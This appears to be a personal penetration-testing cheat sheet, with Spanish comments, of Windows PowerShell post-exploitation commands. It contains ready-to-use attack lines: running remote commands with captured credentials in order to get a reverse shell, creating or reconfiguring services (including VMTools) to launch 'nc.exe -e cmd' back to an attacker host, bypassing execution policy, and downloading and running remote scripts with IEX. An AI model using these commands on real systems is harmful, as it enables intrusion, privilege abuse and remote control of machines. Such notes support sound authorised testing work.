![[Pasted image 20230215173659.png]]

---

## List Services
```powershell
> services
```

## Play with Scripts Block
```PowerShell
# Al tener credenciales, podriamos intentar ejecuta comandos con ese usuario para poder entablarnos una revershell
> $user = '{domain}\{name}'
# Guardamos en la variable user, el nombre del usuario
> $password = ConvertTo-SecureString '{password}' -AsPlainText -Force
# Guardamos en la variable password lo contraseÃ±a, ya que en texto claro nos traeria problemas.
> $cred = New-Object System.Management.Automation.PSCredential($user, $password)
# Creamos la credencial en la variable cred.
> Invoke-Command -ComputerName {computer_name} -Credential $cred -ScriptBlock { "command" }
```


## Create Reverse Shell Service
```powershell

> sc.exe create foo binPath="C:\Users\zaiko\Desktop\nc.exe -e cmd {RHOST} {RPORT}"
```


## Manipulate Service Settings to Execute Reverse Shell
```powershell

> sc.exe config VMTools binPath="C:\Users\zaiko\Desktop\nc.exe -e cmd {RHOST} {RPORT}"
```

  
## Start and Stop Service
```powershell
> sc.exe start {service}

> sc.exe stop {service}
```

  
## Download Files with Powershell
```powershell
> Invoke-WebRequest 'http://{dominio}/{recurso}' -OutFile ''
```

  
## Bypass Execution Policy
```powershell
> Set-ExecutionPolicy Bypass -Scope Process
```

  
## Interpret Powershell from Remote Server
```powershell

> IEX(New-Object Net.WebClient).downloadString('http://{dominio}/{recurso}')
```


## Open ports
```powershell
> netstat -nat 

> netstat -ano -p tcp
```


## System process
```powershell 
> tasklist
```
